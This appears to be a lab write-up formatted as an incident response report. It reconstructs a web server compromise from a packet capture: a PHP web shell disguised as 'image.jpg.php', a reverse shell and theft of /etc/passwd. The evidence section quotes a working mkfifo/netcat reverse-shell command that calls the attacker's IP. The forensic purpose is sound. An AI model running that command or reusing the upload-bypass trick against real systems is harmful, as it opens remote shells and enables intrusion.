# WebStrike Web Server Compromise Investigation (Web Server Compromise)

## Executive Summary

This investigation analyzes a web server compromise involving malicious file upload, web shell deployment, reverse shell communication, and data exfiltration.

A network capture (PCAP) was analyzed using Wireshark to reconstruct the attack chain, identify the attacker infrastructure, determine the exploited vulnerability, and document the compromise indicators.

The investigation confirmed a successful web application compromise resulting in unauthorized remote command execution and sensitive file exfiltration.

---

# Alert

## Detection Source

**SIEM / IDS Alert**

### Alert Type

Suspicious web server activity:

* Unauthorized PHP file upload
* Web shell deployment
* Reverse shell communication
* Data exfiltration

---

# Scenario

A company web server showed suspicious activity indicating possible exploitation.

The SOC analyst was tasked with investigating:

* Attacker origin
* Exploited web application weakness
* Malicious files uploaded
* Remote command execution
* Exfiltrated information

---

# Investigation Environment

## Tools

* Wireshark
* PCAP analysis
* IP Geolocation services
* CyberDefenders WebStrike Lab

---

# Investigation Findings

| Category           | Finding                                                                |
| ------------------ | ---------------------------------------------------------------------- |
| Attacker IP        | `117.11.88.124`                                                        |
| Victim Server IP   | `24.49.63.79`                                                          |
| Attacker Location  | Tianjin, China                                                         |
| User-Agent         | Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |
| Web Shell          | image.jpg.php                                                          |
| Upload Directory   | /reviews/uploads/                                                      |
| Reverse Shell Port | 8080                                                                   |
| Exfiltrated File   | /etc/passwd                                                            |

---

# Attack Chain

```text
Attacker
117.11.88.124
        |
        |
        v
Web Application Upload Vulnerability
        |
        |
        v
image.jpg.php Web Shell
        |
        |
        v
Reverse Shell
Port 8080
        |
        |
        v
Command Execution
        |
        |
        v
/etc/passwd Exfiltration
```

---

# Investigation Process

## Network Analysis

Wireshark filters used:

```
ip.src == 117.11.88.124 && http

ip.src == 117.11.88.124 && http contains ".php"

tcp.flags.syn == 1

http contains "passwd"
```

---

# Key Evidence

## Malicious Upload

Uploaded file:

```
image.jpg.php
```

Location:

```
/reviews/uploads/
```

The attacker bypassed file validation controls by disguising PHP code as an image file.

---

## Reverse Shell

Observed command:

```
rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f
```

The compromised server initiated an outbound shell connection to the attacker.

---

## Data Exfiltration

The attacker retrieved:

```
/etc/passwd
```

using HTTP communication.

---

# Skills Demonstrated

* Web Attack Investigation
* Network Forensics
* PCAP Analysis
* Web Shell Detection
* Incident Response
* IOC Extraction
* MITRE ATT&CK Mapping

---

# AI Assistance

AI was used to assist with investigation documentation, report organization, and improving technical explanations.

All packet analysis, evidence interpretation, Wireshark filtering, and conclusions were performed by the analyst.

